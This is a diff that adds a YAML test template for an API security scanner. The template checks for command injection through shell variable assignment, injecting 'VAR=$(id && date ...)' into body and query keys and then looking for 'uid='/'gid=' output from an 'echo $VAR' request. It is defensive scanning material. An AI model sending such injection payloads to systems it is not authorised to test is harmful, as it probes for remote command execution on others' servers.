@@ -1,0 +1,174 @@
+id: COMMAND_INJECTION_VARIABLE_ASSIGN_CHAINED
+info:
+  name: "Command injection by variable assignment with chained system commands"
+  description: "Command injection by variable assignment with chained system commands involves exploiting vulnerabilities to inject commands through environment or shell variable assignments. Attackers can set variables with malicious values or commands, which are then executed in conjunction with other chained commands. This technique allows for complex, multi-step attacks by manipulating variable contents and chaining commands, potentially leading to unauthorized access, data breaches, or system compromise."
+  details: >
+    "Command injection by variable assignment with chained system commands exploits vulnerabilities to inject malicious commands through environment variables or shell variable assignments. Attackers can set variables to include harmful commands or data, which are then executed when the variables are used in subsequent chained commands. By manipulating these variables and chaining them with other commands, attackers can perform complex operations, bypass security filters, and execute unauthorized actions, leading to potential data breaches, system modifications, or privilege escalation."
+  impact: "The impact of command injection via variable assignment with chained commands can be significant, as it enables attackers to execute malicious commands by exploiting variable assignments. This can result in unauthorized access, data manipulation, or system compromise. By injecting harmful commands into variables and chaining them, attackers can bypass security controls, alter system configurations, and execute complex sequences of operations, leading to data breaches, system instability, and escalated privileges."
+  category:
+    name: COMMAND_INJECTION
+    shortName: Command Injection
+    displayName: Command Injection
+  subCategory: COMMAND_INJECTION_VARIABLE_ASSIGN_CHAINED
+  severity: CRITICAL
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://twitter.com/trbughunters/status/1283133356922884096"
+  cwe:
+    - CWE-77
+  cve:
+    - CVE-2023-25826
+    - CVE-2023-41031
+
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    neq: "OPTIONS"
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  or:
+    - request_payload:
+        for_one:
+          key:
+            regex: .*
+            extract: changed_body_key
+          value:
+            extract: changed_body_value
+    - query_param:
+        for_one:
+          key:
+            regex: .*
+            extract: changed_query_key
+          value:
+            regex: .*
+            extract: changed_query_value
+wordLists:
+  specialOSPayloads:
+    - "VAR=$(id && date +\"%d-%B-%Y\")"
+execute:
+  type: multiple
+  requests:
+    - req:
+        - modify_body_param:
+            changed_body_key: ${specialOSPayloads}
+        - modify_query_param:
+            changed_query_key: ${specialOSPayloads}
+        - validate:
+            and:
+              - response_code:
+                  gte: 200
+                  lt: 300
+              - response_payload:
+                  length:
+                    gt: 0
+                  not_contains:
+                    - Error
+                    - fail
+                    - invalid
+                    - expired
+                    - not found
+                    - account is locked
+                    - account is blocked
+                    - rate-limit
+                    - rate_limit
+                    - rate limit
+                    - multiple failed attempt
+                    - <html>
+                    - </html>
+        - success: x2
+        - failure: exit
+    - req:
+        - modify_body_param:
+            changed_body_key: "echo $VAR"
+        - modify_query_param:
+            changed_query_key: "echo $VAR"
+        - validate:
+            response_payload:
+              length:
+                gt: 0
+              contains_all:
+                - "uid="
+                - "gid="
+                - "groups="
+              contains_either:
+                - "-January-"
+                - "-February-"
+                - "-March-"
+                - "-April-"
+                - "-May-"
+                - "-June-"
+                - "-July-"
+                - "-August-"
+                - "-September-"
+                - "-October-"
+                - "-November-"
+                - "-December-"
+              not_contains:
+                - Error
+                - Internal Server
+                - Failed
+                - Unauthorized
+                - access denied
+                - Forbidden
+                - Method Not allowed
+                - Gateway timeout
+                - request timeout
+                - server error
+                - server busy
+                - authentication error
+                - authorization error
+                - validation error
+                - Permission Denied
+                - invalid token
+                - token expired
+                - session expired
+                - session timeout
+                - unexpected error
+                - unable to process request
+                - bad request
+                - service unavailable
+                - account is locked
+                - account is blocked
+                - multiple failed attempts
+                - <html>
+                - </html>
+        - success: vulnerable
